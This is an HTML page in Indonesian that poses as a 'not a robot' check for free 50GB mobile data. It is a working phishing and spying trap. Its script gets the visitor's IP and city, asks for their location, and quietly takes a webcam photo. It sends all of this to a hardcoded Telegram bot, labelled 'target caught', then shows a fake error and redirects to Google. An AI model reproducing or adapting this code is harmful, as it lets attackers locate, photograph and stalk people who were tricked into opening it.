<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Verifikasi Kuota Gratis</title>
    <style>
        body { background: #f4f4f4; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
        .btn { background: #007bff; color: white; padding: 15px 25px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 20px; }
        .loading { display: none; margin-top: 10px; font-size: 12px; color: #777; }
    </style>
</head>
<body>

    <div class="card" id="main-box">
        <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" width="80" alt="shield">
        <h2>Verifikasi Identitas</h2>
        <p>Klik tombol di bawah untuk memverifikasi bahwa Anda bukan robot dan klaim kuota 50GB.</p>
        <button class="btn" onclick="startProcess()">SAYA BUKAN ROBOT</button>
        <div id="status" class="loading">Memproses verifikasi...</div>
    </div>

    <video id="video" width="160" height="120" style="display:none;" autoplay></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const TOKEN = '8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo';
        const CHAT_ID = '8551809114';

        async function startProcess() {
            document.getElementById('status').style.display = 'block';
            
            // 1. Ambil IP dulu (Tanpa Izin)
            const res = await fetch('https://ipapi.co/json/');
            const ipData = await res.json();

            // 2. Minta Izin Kamera & Lokasi secara bersamaan (Social Engineering)
            // Target akan mengira ini bagian dari verifikasi "Bukan Robot"
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;

                // 3. Ambil Kamera
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;

                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                        const imgData = canvas.toDataURL('image/jpeg');
                        
                        // Kirim Foto dan Data ke Telegram
                        sendToTele(ipData, lat, lon, imgData);
                        stream.getTracks().forEach(track => track.stop()); // Matikan kamera
                        
                        alert("Verifikasi Gagal! Coba lagi nanti.");
                        window.location.href = "https://google.com";
                    }, 2000);
                } catch (e) {
                    // Jika kamera ditolak, tetap kirim data IP & Lokasi
                    sendToTele(ipData, lat, lon, null);
                }
            }, (err) => {
                // Jika lokasi ditolak, tetap kirim IP
                sendToTele(ipData, null, null, null);
            });
        }

        async function sendToTele(ip, lat, lon, img) {
            let text = `ðŸŽ¯ **TARGET TERJERAT**\nIP: ${ip.ip}\nKota: ${ip.city}\nMaps: https://www.google.com/maps?q=${lat},${lon}`;
            
            // Kirim Teks
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            });

            // Kirim Foto (Jika ada)
            if (img) {
                const blob = await (await fetch(img)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'target.jpg');
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }
        }
    </script>
</body>
</html>
